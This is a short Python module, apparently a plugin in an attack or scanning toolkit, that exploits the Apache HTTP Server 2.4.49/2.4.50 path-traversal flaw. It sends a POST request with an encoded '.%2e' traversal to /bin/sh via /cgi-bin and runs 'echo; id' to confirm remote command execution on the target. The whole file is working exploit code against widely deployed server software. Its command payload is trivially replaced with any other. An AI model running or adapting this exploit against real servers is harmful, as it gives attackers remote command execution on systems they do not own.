import requests
from core.printmodels import *

class Apache_RCE_Exploit:
    def __init__(self):
        self.name = "Apache RCE"
        self.description = "Apache HTTP Server 2.4.49/2.4.50 RCE"
        self.author = "mrphoenix"

    def Exploit(self, site):
        try:
            endpoint = f"{site}/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh"
            headers = {"Content-Type": "application/x-www-form-urlencoded"}
            data = "echo; id"
            response = requests.post(endpoint, headers=headers, data=data, verify=False, timeout=10)
            
            if response.status_code == 200 and "uid=" in response.text:
                return PrintSuccess(f"[Apache-RCE] Vulnerable! Command execution successful")
            return PrintFailed("[Apache-RCE] Not Vulnerable")
        except Exception as e:
            return PrintError(f"[Apache-RCE] Error: {str(e)}")
